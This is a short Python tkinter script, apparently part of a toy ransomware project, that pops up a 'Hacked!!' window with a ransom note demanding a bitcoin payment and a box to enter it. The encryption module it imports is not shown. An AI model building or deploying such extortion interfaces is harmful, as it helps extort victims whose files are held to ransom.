from tkinter import *
import tkinter
from tkinter.ttk import *

import encrypt

payment = ""
def pop_up_win():
    def get_input():
        global payment
        payment = inputtxt.get(1.0, END)
    
    master = Tk()
    master.title = "Hacked!!"
    
    master.geometry("600x600")
    message ='This is a ransomware note!!!\n'
    message += "Enter your bitcoin payment below to get your files back!!"

    l = Label(master, text = message)
    l.config(font =("Courier", 14))
    l.pack()

    # TextBox Creation
    inputtxt = tkinter.Text(master, height = 5, width = 20)
    inputtxt.pack()

    button_frame = Frame(master)
    button_frame.pack()
    get_inp_b = Button(button_frame, text = "submit", command = get_input)
    get_inp_b.pack()

    master.mainloop()